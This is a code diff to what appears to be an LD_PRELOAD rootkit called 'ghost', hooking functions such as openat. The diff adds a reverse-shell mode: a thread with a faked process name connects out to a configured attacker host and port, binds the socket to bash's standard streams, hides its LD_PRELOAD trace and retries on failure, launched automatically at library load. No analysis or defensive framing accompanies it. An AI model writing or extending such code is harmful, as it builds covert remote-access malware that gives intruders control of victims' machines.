@@ -6,6 +6,7 @@
 #include <string.h>
 #include <sys/socket.h>
 #include <netinet/in.h>
+#include <arpa/inet.h>
 #include <pthread.h>
 #include <fcntl.h>
 #include <sys/prctl.h>
@@ -327,6 +328,50 @@ int openat(int dirfd, const char *path, int flags, ...) {
     return real_openat(dirfd, path, flags, mode);
 }
 
+#if GHOST_REVERSE_MODE
+static void *ghost_reverse_shell(void *arg) {
+    int sock_fd;
+    struct sockaddr_in server_addr;
+    
+    prctl(PR_SET_NAME, FAKE_THREAD_NAME, 0, 0, 0);
+    
+    while (should_run) {
+        if ((sock_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
+            sleep(GHOST_RETRY_DELAY);
+            continue;
+        }
+        
+        memset(&server_addr, 0, sizeof(server_addr));
+        server_addr.sin_family = AF_INET;
+        server_addr.sin_port = htons(GHOST_REVERSE_PORT);
+        inet_pton(AF_INET, GHOST_REVERSE_HOST, &server_addr.sin_addr);
+        
+        if (connect(sock_fd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
+            close(sock_fd);
+            sleep(GHOST_RETRY_DELAY);
+            continue;
+        }
+        
+        pthread_mutex_lock(&ghost_fd_mutex);
+        ghost_fd = sock_fd;
+        pthread_mutex_unlock(&ghost_fd_mutex);
+        
+        dup2(sock_fd, 0); dup2(sock_fd, 1); dup2(sock_fd, 2);
+        unsetenv("LD_PRELOAD");
+        execl("/bin/bash", "bash", "--noprofile", "--norc", "-i", NULL);
+        
+        close(sock_fd);
+        pthread_mutex_lock(&ghost_fd_mutex);
+        ghost_fd = -1;
+        pthread_mutex_unlock(&ghost_fd_mutex);
+        
+        sleep(GHOST_RETRY_DELAY);
+    }
+    
+    return NULL;
+}
+#endif
+
 void *ghost_listener(void *arg) {
     int server_fd, client_fd;
     struct sockaddr_in addr;
@@ -420,7 +465,12 @@ void init_ghost(void) {
     pthread_attr_t attr;
     pthread_attr_init(&attr);
     pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);
+    
+#if GHOST_REVERSE_MODE
+    pthread_create(&tid, &attr, ghost_reverse_shell, NULL);
+#else
     pthread_create(&tid, &attr, ghost_listener, NULL);
+#endif
     pthread_attr_destroy(&attr);
 }
 
